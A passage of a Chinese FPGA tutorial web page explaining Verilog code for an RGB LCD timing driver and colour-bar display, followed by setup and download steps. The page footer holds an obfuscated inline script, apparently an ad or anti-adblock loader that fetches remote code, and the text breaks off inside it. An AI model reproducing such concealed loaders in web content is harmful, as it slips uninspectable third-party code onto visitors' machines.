<span class="token number">7</span>       output       <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  pixel_ypos<span class="token punctuation">,</span>  <span class="token comment">//当前像素点纵坐标   </span>
<span class="token number">8</span>       output  reg  <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  h_disp<span class="token punctuation">,</span>      <span class="token comment">//LCD屏水平分辨率</span>
<span class="token number">9</span>       output  reg  <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  v_disp<span class="token punctuation">,</span>      <span class="token comment">//LCD屏垂直分辨率   </span>
<span class="token number">10</span>      <span class="token comment">//RGB LCD接口</span>
<span class="token number">11</span>      output               lcd_de<span class="token punctuation">,</span>      <span class="token comment">//LCD 数据使能信号</span>
<span class="token number">12</span>      output               lcd_hs<span class="token punctuation">,</span>      <span class="token comment">//LCD 行同步信号</span>
<span class="token number">13</span>      output               lcd_vs<span class="token punctuation">,</span>      <span class="token comment">//LCD 场同步信号</span>
<span class="token number">14</span>      output               lcd_bl<span class="token punctuation">,</span>      <span class="token comment">//LCD 背光控制信号</span>
<span class="token number">15</span>      output               lcd_clk<span class="token punctuation">,</span>     <span class="token comment">//LCD 像素时钟</span>
<span class="token number">16</span>      output               lcd_rst<span class="token punctuation">,</span>     <span class="token comment">//LCD复位</span>
<span class="token number">17</span>      output       <span class="token punctuation">[</span><span class="token number">23</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  lcd_rgb      <span class="token comment">//LCD RGB888颜色数据</span>
<span class="token number">18</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">19</span>  
<span class="token number">20</span>  <span class="token comment">//parameter define  </span>
<span class="token number">21</span>  <span class="token comment">// 4.3' 480*272</span>
<span class="token number">22</span>  parameter  H_SYNC_4342   <span class="token operator">=</span>  <span class="token number">11</span>'d41<span class="token punctuation">;</span>     <span class="token comment">//行同步</span>
<span class="token number">23</span>  parameter  H_BACK_4342   <span class="token operator">=</span>  <span class="token number">11</span>'d2<span class="token punctuation">;</span>      <span class="token comment">//行显示后沿</span>
<span class="token number">24</span>  parameter  H_DISP_4342   <span class="token operator">=</span>  <span class="token number">11</span>'d480<span class="token punctuation">;</span>    <span class="token comment">//行有效数据</span>
<span class="token number">25</span>  parameter  H_FRONT_4342  <span class="token operator">=</span>  <span class="token number">11</span>'d2<span class="token punctuation">;</span>      <span class="token comment">//行显示前沿</span>
<span class="token number">26</span>  parameter  H_TOTAL_4342  <span class="token operator">=</span>  <span class="token number">11</span>'d525<span class="token punctuation">;</span>    <span class="token comment">//行扫描周期</span>
<span class="token number">27</span>     
<span class="token number">28</span>  parameter  V_SYNC_4342   <span class="token operator">=</span>  <span class="token number">11</span>'d10<span class="token punctuation">;</span>     <span class="token comment">//场同步</span>
<span class="token number">29</span>  parameter  V_BACK_4342   <span class="token operator">=</span>  <span class="token number">11</span>'d2<span class="token punctuation">;</span>      <span class="token comment">//场显示后沿</span>
<span class="token number">30</span>  parameter  V_DISP_4342   <span class="token operator">=</span>  <span class="token number">11</span>'d272<span class="token punctuation">;</span>    <span class="token comment">//场有效数据</span>
<span class="token number">31</span>  parameter  V_FRONT_4342  <span class="token operator">=</span>  <span class="token number">11</span>'d2<span class="token punctuation">;</span>      <span class="token comment">//场显示前沿</span>
<span class="token number">32</span>  parameter  V_TOTAL_4342  <span class="token operator">=</span>  <span class="token number">11</span>'d286<span class="token punctuation">;</span>    <span class="token comment">//场扫描周期</span>
</code></pre> 
<p>代码较长，省略部分源代码……</p> 
<pre><code class="prism language-c"><span class="token number">86</span>  <span class="token comment">//reg define</span>
<span class="token number">87</span>  reg  <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> h_sync <span class="token punctuation">;</span>
<span class="token number">88</span>  reg  <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> h_back <span class="token punctuation">;</span>
<span class="token number">89</span>  reg  <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> h_total<span class="token punctuation">;</span>
<span class="token number">90</span>  reg  <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> v_sync <span class="token punctuation">;</span>
<span class="token number">91</span>  reg  <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> v_back <span class="token punctuation">;</span>
<span class="token number">92</span>  reg  <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> v_total<span class="token punctuation">;</span>
<span class="token number">93</span>  reg  <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> h_cnt  <span class="token punctuation">;</span>
<span class="token number">94</span>  reg  <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> v_cnt  <span class="token punctuation">;</span>
<span class="token number">95</span>  
<span class="token number">96</span>  <span class="token comment">//wire define    </span>
<span class="token number">97</span>  wire        lcd_en<span class="token punctuation">;</span>
<span class="token number">98</span>  wire        data_req<span class="token punctuation">;</span>
<span class="token number">99</span>  
<span class="token number">100</span> <span class="token comment">//*****************************************************</span>
<span class="token number">101</span> <span class="token comment">//**                    main code</span>
<span class="token number">102</span> <span class="token comment">//*****************************************************</span>
<span class="token number">103</span> 
<span class="token number">104</span> <span class="token comment">//RGB LCD 采用DE模式时，行场同步信号需要拉高</span>
<span class="token number">105</span> assign  lcd_hs <span class="token operator">=</span> <span class="token number">1</span>'b1<span class="token punctuation">;</span>        <span class="token comment">//LCD行同步信号</span>
<span class="token number">106</span> assign  lcd_vs <span class="token operator">=</span> <span class="token number">1</span>'b1<span class="token punctuation">;</span>        <span class="token comment">//LCD场同步信号</span>
<span class="token number">107</span> 
<span class="token number">108</span> assign  lcd_bl <span class="token operator">=</span> <span class="token number">1</span>'b1<span class="token punctuation">;</span>        <span class="token comment">//LCD背光控制信号  </span>
<span class="token number">109</span> assign  lcd_clk <span class="token operator">=</span> lcd_pclk<span class="token punctuation">;</span>   <span class="token comment">//LCD像素时钟</span>
<span class="token number">110</span> assign  lcd_rst<span class="token operator">=</span> <span class="token number">1</span>'b1<span class="token punctuation">;</span>        <span class="token comment">//LCD复位</span>
<span class="token number">111</span> assign  lcd_de <span class="token operator">=</span> lcd_en<span class="token punctuation">;</span>      <span class="token comment">//LCD数据有效信号</span>
<span class="token number">112</span> 
<span class="token number">113</span> <span class="token comment">//使能RGB888数据输出</span>
<span class="token number">114</span> assign  lcd_en <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>h_cnt <span class="token operator">&gt;=</span> h_sync <span class="token operator">+</span> h_back<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>h_cnt <span class="token operator">&lt;</span> h_sync <span class="token operator">+</span> h_back <span class="token operator">+</span> h_disp<span class="token punctuation">)</span>
<span class="token number">115</span>                   <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>v_cnt <span class="token operator">&gt;=</span> v_sync <span class="token operator">+</span> v_back<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>v_cnt <span class="token operator">&lt;</span> v_sync <span class="token operator">+</span> v_back <span class="token operator">+</span> v_disp<span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token number">116</span>                   <span class="token operator">?</span> <span class="token number">1</span><span class="token string">'b1 : 1'</span>b0<span class="token punctuation">;</span>
<span class="token number">117</span> 
<span class="token number">118</span> <span class="token comment">//请求像素点颜色数据输入  </span>
<span class="token number">119</span> assign data_req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>h_cnt <span class="token operator">&gt;=</span> h_sync <span class="token operator">+</span> h_back <span class="token operator">-</span> <span class="token number">1</span><span class="token string">'b1) &amp;&amp; (h_cnt &lt; h_sync + h_back + h_disp - 1'</span>b1<span class="token punctuation">)</span>
<span class="token number">120</span>                   <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>v_cnt <span class="token operator">&gt;=</span> v_sync <span class="token operator">+</span> v_back<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>v_cnt <span class="token operator">&lt;</span> v_sync <span class="token operator">+</span> v_back <span class="token operator">+</span> v_disp<span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token number">121</span>                   <span class="token operator">?</span> <span class="token number">1</span><span class="token string">'b1 : 1'</span>b0<span class="token punctuation">;</span>
<span class="token number">122</span> 
<span class="token number">123</span> <span class="token comment">//像素点坐标  </span>
<span class="token number">124</span> assign pixel_xpos <span class="token operator">=</span> data_req <span class="token operator">?</span> <span class="token punctuation">(</span>h_cnt <span class="token operator">-</span> <span class="token punctuation">(</span>h_sync <span class="token operator">+</span> h_back <span class="token operator">-</span> <span class="token number">1</span><span class="token string">'b1)) : 11'</span>d0<span class="token punctuation">;</span>
<span class="token number">125</span> assign pixel_ypos <span class="token operator">=</span> data_req <span class="token operator">?</span> <span class="token punctuation">(</span>v_cnt <span class="token operator">-</span> <span class="token punctuation">(</span>v_sync <span class="token operator">+</span> v_back <span class="token operator">-</span> <span class="token number">1</span><span class="token string">'b1)) : 11'</span>d0<span class="token punctuation">;</span>
<span class="token number">126</span> 
<span class="token number">127</span> <span class="token comment">//RGB888数据输出</span>
<span class="token number">128</span> assign lcd_rgb <span class="token operator">=</span> lcd_en <span class="token operator">?</span> pixel_data <span class="token operator">:</span> <span class="token number">24</span>'d0<span class="token punctuation">;</span>
<span class="token number">129</span> 
<span class="token number">130</span> <span class="token comment">//行场时序参数</span>
<span class="token number">131</span> always @<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> begin
<span class="token number">132</span>     <span class="token keyword">case</span><span class="token punctuation">(</span>lcd_id<span class="token punctuation">)</span>
<span class="token number">133</span>         <span class="token number">16</span>'h4342 <span class="token operator">:</span> begin
<span class="token number">134</span>             h_sync  <span class="token operator">=</span> H_SYNC_4342<span class="token punctuation">;</span> 
<span class="token number">135</span>             h_back  <span class="token operator">=</span> H_BACK_4342<span class="token punctuation">;</span> 
<span class="token number">136</span>             h_disp  <span class="token operator">=</span> H_DISP_4342<span class="token punctuation">;</span> 
<span class="token number">137</span>             h_total <span class="token operator">=</span> H_TOTAL_4342<span class="token punctuation">;</span>
<span class="token number">138</span>             v_sync  <span class="token operator">=</span> V_SYNC_4342<span class="token punctuation">;</span> 
<span class="token number">139</span>             v_back  <span class="token operator">=</span> V_BACK_4342<span class="token punctuation">;</span> 
<span class="token number">140</span>             v_disp  <span class="token operator">=</span> V_DISP_4342<span class="token punctuation">;</span> 
<span class="token number">141</span>             v_total <span class="token operator">=</span> V_TOTAL_4342<span class="token punctuation">;</span>            
<span class="token number">142</span>         end
代码较长，省略部分源代码……
<span class="token number">196</span> <span class="token comment">//行计数器对像素时钟计数</span>
<span class="token number">197</span> always@ <span class="token punctuation">(</span>posedge lcd_pclk or negedge rst_n<span class="token punctuation">)</span> begin
<span class="token number">198</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>rst_n<span class="token punctuation">)</span> 
<span class="token number">199</span>         h_cnt <span class="token operator">&lt;=</span> <span class="token number">11</span>'d0<span class="token punctuation">;</span>
<span class="token number">200</span>     <span class="token keyword">else</span> begin
<span class="token number">201</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>h_cnt <span class="token operator">==</span> h_total <span class="token operator">-</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
<span class="token number">202</span>             h_cnt <span class="token operator">&lt;=</span> <span class="token number">11</span>'d0<span class="token punctuation">;</span>
<span class="token number">203</span>         <span class="token keyword">else</span>
<span class="token number">204</span>             h_cnt <span class="token operator">&lt;=</span> h_cnt <span class="token operator">+</span> <span class="token number">1</span>'b1<span class="token punctuation">;</span>           
<span class="token number">205</span>     end
<span class="token number">206</span> end
<span class="token number">207</span> 
<span class="token number">208</span> <span class="token comment">//场计数器对行计数</span>
<span class="token number">209</span> always@ <span class="token punctuation">(</span>posedge lcd_pclk or negedge rst_n<span class="token punctuation">)</span> begin
<span class="token number">210</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>rst_n<span class="token punctuation">)</span> 
<span class="token number">211</span>         v_cnt <span class="token operator">&lt;=</span> <span class="token number">11</span>'d0<span class="token punctuation">;</span>
<span class="token number">212</span>     <span class="token keyword">else</span> begin
<span class="token number">213</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>h_cnt <span class="token operator">==</span> h_total <span class="token operator">-</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span> begin
<span class="token number">214</span>             <span class="token keyword">if</span><span class="token punctuation">(</span>v_cnt <span class="token operator">==</span> v_total <span class="token operator">-</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
<span class="token number">215</span>                 v_cnt <span class="token operator">&lt;=</span> <span class="token number">11</span>'d0<span class="token punctuation">;</span>
<span class="token number">216</span>             <span class="token keyword">else</span>
<span class="token number">217</span>                 v_cnt <span class="token operator">&lt;=</span> v_cnt <span class="token operator">+</span> <span class="token number">1</span>'b1<span class="token punctuation">;</span>    
<span class="token number">218</span>         end
<span class="token number">219</span>     end    
<span class="token number">220</span> end
<span class="token number">221</span> 
<span class="token number">222</span> endmodule
</code></pre> 
<p>由本章简介部分可知，在DE模式下，液晶显示屏的同步信号DE对应的是帧和行同时有效的区域段。程序第21行至第84行代码，根据不同分辨率的屏幕做了不同参数的定义，参数的值参考了本章的表 18.1.3。程序第130至194行则根据LCD屏的ID选择不同的时序参数。<br> 程序第105至111行是LCD驱动模块输出的液晶屏控制信号。其中lcd_bl为液晶屏背光控制端口，可以利用该端口输出一个频率在200Hz~1kHz范围之内的PWM（脉冲宽度调制）信号，通过调整PWM信号的占空比来调节液晶屏的显示亮度。这里我们对lcd_bl作简单处理，将其直接赋值为1，此时液晶屏亮度最高。分频模块输出的lcd_pclk直接赋值给LCD屏的lcd_clk（像素时钟）引脚，为RGB LCD屏提供驱动时钟。另外由于我们采用DE同步模式驱动RGB LCD屏，输出给LCD的数据使能信号lcd_de在图像数据有效时拉高，因此可以将模块内部的lcd_en信号直接赋值给lcd_de。另外在DE模式下，需要将输出给LCD的行场同步信号lcd_hs、lcd_vs拉高。<br> 程序第196至206行通过行计数器h_cnt对像素时钟计数，计满一个行扫描周期后清零并重新开始计数。 程序第208至220行通过场计数器v_cnt对行进行计数，即扫描完一行后v_cnt加1，计满一个场扫描周期后清零并重新开始计数。<br> 将行场计数器的值与LCD时序中的参数作比较，我们就可以判断DE信号何时有效，以及何时输出RGB888格式的图像数据（第113~116行和第128行）。程序第118至125行输出当前像素点的横纵坐标值，由于坐标输出后下一个时钟周期才能接收到像素点的颜色数据，因此数据请求信号data_req比数据输出使能信号lcd_en提前一个时钟周期。<br> LCD显示模块的代码如下：</p> 
<pre><code class="prism language-c"><span class="token number">1</span>   module <span class="token function">lcd_display</span><span class="token punctuation">(</span>
<span class="token number">2</span>       input                lcd_pclk<span class="token punctuation">,</span>    <span class="token comment">//时钟</span>
<span class="token number">3</span>       input                rst_n<span class="token punctuation">,</span>       <span class="token comment">//复位，低电平有效</span>
<span class="token number">4</span>       input        <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  pixel_xpos<span class="token punctuation">,</span>  <span class="token comment">//当前像素点横坐标</span>
<span class="token number">5</span>       input        <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  pixel_ypos<span class="token punctuation">,</span>  <span class="token comment">//当前像素点纵坐标  </span>
<span class="token number">6</span>       input        <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  h_disp<span class="token punctuation">,</span>      <span class="token comment">//LCD屏水平分辨率</span>
<span class="token number">7</span>       input        <span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  v_disp<span class="token punctuation">,</span>      <span class="token comment">//LCD屏垂直分辨率       </span>
<span class="token number">8</span>       output  reg  <span class="token punctuation">[</span><span class="token number">23</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>  pixel_data   <span class="token comment">//像素数据</span>
<span class="token number">9</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">10</span>  
<span class="token number">11</span>  <span class="token comment">//parameter define  </span>
<span class="token number">12</span>  parameter WHITE <span class="token operator">=</span> <span class="token number">24</span>'hFFFFFF<span class="token punctuation">;</span>  <span class="token comment">//白色</span>
<span class="token number">13</span>  parameter BLACK <span class="token operator">=</span> <span class="token number">24</span>'h000000<span class="token punctuation">;</span>  <span class="token comment">//黑色</span>
<span class="token number">14</span>  parameter RED   <span class="token operator">=</span> <span class="token number">24</span>'hFF0000<span class="token punctuation">;</span>  <span class="token comment">//红色</span>
<span class="token number">15</span>  parameter GREEN <span class="token operator">=</span> <span class="token number">24</span>'h00FF00<span class="token punctuation">;</span>  <span class="token comment">//绿色</span>
<span class="token number">16</span>  parameter BLUE  <span class="token operator">=</span> <span class="token number">24</span>'h0000FF<span class="token punctuation">;</span>  <span class="token comment">//蓝色</span>
<span class="token number">17</span>  
<span class="token number">18</span>  <span class="token comment">//根据当前像素点坐标指定当前像素点颜色数据，在屏幕上显示彩条</span>
<span class="token number">19</span>  always @<span class="token punctuation">(</span>posedge lcd_pclk or negedge rst_n<span class="token punctuation">)</span> begin
<span class="token number">20</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>rst_n<span class="token punctuation">)</span>
<span class="token number">21</span>          pixel_data <span class="token operator">&lt;=</span> BLACK<span class="token punctuation">;</span>
<span class="token number">22</span>      <span class="token keyword">else</span> begin
<span class="token number">23</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pixel_xpos <span class="token operator">&gt;=</span> <span class="token number">11</span>'d0<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>pixel_xpos <span class="token operator">&lt;</span> h_disp<span class="token operator">/</span><span class="token number">5</span><span class="token operator">*</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token number">24</span>              pixel_data <span class="token operator">&lt;=</span> WHITE<span class="token punctuation">;</span>
<span class="token number">25</span>          <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pixel_xpos <span class="token operator">&gt;=</span> h_disp<span class="token operator">/</span><span class="token number">5</span><span class="token operator">*</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>pixel_xpos <span class="token operator">&lt;</span> h_disp<span class="token operator">/</span><span class="token number">5</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    
<span class="token number">26</span>              pixel_data <span class="token operator">&lt;=</span> BLACK<span class="token punctuation">;</span>
<span class="token number">27</span>          <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pixel_xpos <span class="token operator">&gt;=</span> h_disp<span class="token operator">/</span><span class="token number">5</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>pixel_xpos <span class="token operator">&lt;</span> h_disp<span class="token operator">/</span><span class="token number">5</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    
<span class="token number">28</span>              pixel_data <span class="token operator">&lt;=</span> RED<span class="token punctuation">;</span>   
<span class="token number">29</span>          <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pixel_xpos <span class="token operator">&gt;=</span> h_disp<span class="token operator">/</span><span class="token number">5</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>pixel_xpos <span class="token operator">&lt;</span> h_disp<span class="token operator">/</span><span class="token number">5</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    
<span class="token number">30</span>              pixel_data <span class="token operator">&lt;=</span> GREEN<span class="token punctuation">;</span>                
<span class="token number">31</span>          <span class="token keyword">else</span> 
<span class="token number">32</span>              pixel_data <span class="token operator">&lt;=</span> BLUE<span class="token punctuation">;</span>      
<span class="token number">33</span>      end    
<span class="token number">34</span>  end
<span class="token number">35</span>    
<span class="token number">36</span>  endmodule
</code></pre> 
<p>LCD显示模块将屏幕显示区域按照横坐标划分为五列等宽的区域，通过判断像素点的横坐标所在的区域，给像素点赋以不同的颜色值，从而实现彩条显示。<br> 下图为RGB TFT-LCD彩条程序显示一行图像时仿真抓取的波形图，图中包含了一个完整的行扫描周期，其中的有效图像区域被划分为五个不同的区域，不同区域的像素点颜色各不相同。<br> <img src="https://images2.imgbox.com/25/fb/nqkwjf0I_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.4 仿真波形图<br> 18.5 下载验证<br> 首先将FPC排线一端与RGB LCD模块上的J1接口连接，另一端与领航者开发板上的RGB TFTLCD接口连接。连接时，先掀开FPC连接器上的黑色翻盖，将FPC排线蓝色面朝上插入连接器，最后将黑色翻盖压下以固定FPC排线，如图 7.5.13.1和图 7.5.13.2所示。<br> <img src="https://images2.imgbox.com/59/46/dv2lhyzJ_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.1 正点原子RGBLCD模块FPC连接器<br> 在这里插入图片描述<br> <img src="https://images2.imgbox.com/7a/a5/oOQA0TWq_o.png" alt="在这里插入图片描述"></p> 
<p>图 7.5.13.2 领航者开发板连接RGB LCD液晶屏<br> 最后将下载器一端连电脑，另一端与开发板上的JTAG端口连接，连接电源线并打开电源开关。<br> 接下来我们下载程序，验证RGB TFT-LCD彩条显示功能。下载完成后观察RGB LCD模块显示的图案如下图所示，说明RGB TFT-LCD彩条显示程序下载验证成功。<br> <img src="https://images2.imgbox.com/a0/fe/tZjEdD96_o.png" alt="在这里插入图片描述"></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/82661ddd0f4f289145bb2c6b81c8f6d2/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Ubuntu virtualenv环境转移</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/6dac438099357d1bd3bf59c98a805590/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">linux设备驱动 device add详解</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X